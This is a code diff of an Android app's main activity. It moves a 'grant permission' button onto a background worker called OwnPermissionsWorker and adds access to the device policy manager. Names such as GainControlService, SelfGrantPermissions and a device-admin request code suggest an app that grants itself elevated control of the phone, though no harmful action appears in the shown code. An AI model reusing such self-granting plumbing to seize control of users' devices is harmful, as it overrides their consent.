@@ -5,8 +5,11 @@ import static com.agx.catra.common.Constants.RC_GET_DEVICE_ADMIN;
 import static com.agx.catra.common.Constants.SET_PASSWORD;
 
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.work.OneTimeWorkRequest;
+import androidx.work.WorkManager;
 
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -17,6 +20,7 @@ import android.widget.Button;
 import android.widget.CheckBox;
 
 import com.agx.catra.control.GainControlService;
+import com.agx.catra.workers.OwnPermissionsWorker;
 
 public class MainActivity extends AppCompatActivity {
     private static final String TAG = "GainControlService";
@@ -25,6 +29,8 @@ public class MainActivity extends AppCompatActivity {
 
     private static Context context;
     public static AppCompatActivity activity;
+    private static DevicePolicyManager devicePolicyManager ;
+
 
 
 
@@ -32,6 +38,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         setActivity(this);
         setContext(this);
+        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
 
 
 
@@ -43,7 +50,10 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         btn_grantPermission = (Button) findViewById(R.id.btn_grandPermission);
         btn_grantPermission.setOnClickListener(v -> {
-            GainControlService.SelfGrantPermissions(getContext());
+            WorkManager
+                    .getInstance(getContext())
+                    .enqueue(new OneTimeWorkRequest.Builder(OwnPermissionsWorker.class).build());
+
         });
 
 
@@ -74,5 +84,13 @@ public class MainActivity extends AppCompatActivity {
 
     public static void setContext(Context context) {
         MainActivity.context = context;
+    }
+
+    public static DevicePolicyManager getDevicePolicyManager() {
+        return devicePolicyManager;
+    }
+
+    public static void setDevicePolicyManager(DevicePolicyManager devicePolicyManager) {
+        MainActivity.devicePolicyManager = devicePolicyManager;
     }
 }
